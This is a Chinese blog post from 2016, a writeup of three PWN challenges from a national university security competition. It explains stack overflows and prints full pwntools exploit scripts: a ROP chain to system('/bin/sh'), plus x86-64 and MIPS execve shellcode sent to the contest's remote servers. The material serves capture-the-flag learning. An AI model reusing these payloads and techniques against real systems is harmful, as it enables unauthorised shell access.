---
layout: post
title: 全国大学生信息安全竞赛writeup（PWN）
categories:
  - 安全
url: 238.html
id: 238
comments: false
date: 2016-07-11 12:01:09
tags:
---

### PWN1:(Careful)

明显的栈溢出，通过指定v3可以覆盖返回地址，想要构造shellcode太短了，只能写10个字节，注意到i也在栈上，所以可以重置计数器， ![](http://skysider.com/wp-content/uploads/2016/07/111-205x300.png) 最后exp如下：

#!/usr/bin/env python
from pwn import *

DEBUG=0
if DEBUG:
    p = process("./bin/A44DD70F78267A1CCBEE12FE0D490AD6")
    context.log_level = 'debug'
else:
    p = remote("106.75.37.29", 10000)


def resetCounter():
    p.recvuntil("input index:")
    p.sendline("28")
    p.recvuntil("input value:")
    p.sendline(str(0x0))

def writeAddress(start, addr):
    data = hex(addr)\[2:\].rjust(8,'0')
    print data
    p.recvuntil("input index:")
    p.sendline(str(start))
    p.recvuntil("input value:")
    p.sendline(str(int(data\[6:\],16)))

    p.recvuntil("input index:")
    p.sendline(str(start+1))
    p.recvuntil("input value:")
    p.sendline(str(int(data\[4:6\],16)))

    p.recvuntil("input index:")
    p.sendline(str(start+2))
    p.recvuntil("input value:")
    p.sendline(str(int(data\[2:4\],16)))

    p.recvuntil("input index:")
    p.sendline(str(start+3))
    p.recvuntil("input value:")
    p.sendline(str(int(data\[:2\],16)))

def setCounter():
    p.recvuntil("input index:")
    p.sendline("28")
    p.recvuntil("input value:")
    p.sendline(str(0x10))


def exp():
    writeAddress(44, 0x08048420) #scanf
    writeAddress(48, 0x080486ae) #pop pop ret
    resetCounter()

    writeAddress(52, 0x080486ed) # %d
    writeAddress(56, 0x0804a200) # /bin
    resetCounter()

    writeAddress(60, 0x08048420) #scanf
    writeAddress(64, 0x080486ae) #pop pop ret
    resetCounter()

    writeAddress(68, 0x080486ed) #%d
    writeAddress(72, 0x0804a204) #/sh
    resetCounter()

    writeAddress(76, 0x080483e0) #plt@system
    writeAddress(84, 0x0804a200)

    raw_input("bp2")
    setCounter()

    p.sendline(str(u32('/bin')))
    p.sendline(str(u32('/sh\\x00')))

    p.interactive()

exp()

### PWN2:(Cis2)

还是栈溢出，注意到handle\_op\_code中没有对safe_stack 进行边界检查，可以溢出返回地址，将payload放到全局数组buffer里，跳转到buffer即可。 ![](http://skysider.com/wp-content/uploads/2016/07/QQ%E5%9B%BE%E7%89%8720160711154044-300x247.png) Exp如下：

#!/usr/bin/env python
from pwn import *

DEBUG=0
if DEBUG:
    p = process("./bin/0A77F6D4BD5CB2700A89F9C6F8D8F116")
else:
    p = remote("106.75.37.31", 23333)

def exp():
    p.recvuntil("Fight!\\n")
    for i in range(30):
        p.sendline(str(0x602088))

    p.sendline('m')
    p.sendline('w')
    p.sendline('w')
    p.sendline('w')
    p.sendline('-')
    raw_input("bp")
    payload="\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"
    p.sendline('q'+'a'*7+payload)

    p.interactive()


exp()

### PWN3 mips

第一次接触mips架构的题目，汇编代码看了半天，有个点没get到，最后没有解出来，后来看了别人的wp之后，才发现真的就差一点，栈溢出是非常明显的 ![](http://skysider.com/wp-content/uploads/2016/07/QQ图片20160711153533-300x149.png) 并且程序输入某个值可以打印处栈地址，而且没开nx，后面就直接覆盖返回地址为stack上放置payload的地址即可。

from pwn import *

#context.log_level = 'debug'
#context.update(arch='mips', endian='little')
p = remote("106.75.32.60", 10000)

p.recvuntil("help.\\n")


p.sendline('2057561479')
p.recvuntil("0x")
stack_addr = int(p.recv(8), 16)

print "stack\_addr =>", hex(stack\_addr)
p.sendline('1'*0x70+p32(stack_addr+8))
p.recv()

payload = 'a'*8
payload += "\\xff\\xff\\x10\\x04"
payload += "\\xab\\x0f\\x02\\x24"
payload += "\\x55\\xf0\\x46\\x20"
payload += "\\x66\\x06\\xff\\x23"
payload += "\\xc2\\xf9\\xec\\x23"
payload += "\\x66\\x06\\xbd\\x23"
payload += "\\x9a\\xf9\\xac\\xaf"
payload += "\\x9e\\xf9\\xa6\\xaf"
payload += "\\x9a\\xf9\\xbd\\x23"
payload += "\\x21\\x20\\x80\\x01"
payload += "\\x21\\x28\\xa0\\x03"
payload += "\\xcc\\xcd\\x44\\x03"
payload += "/bin/sh"

p.sendline(payload)
p.recv()

p.sendline('exit')
p.interactive()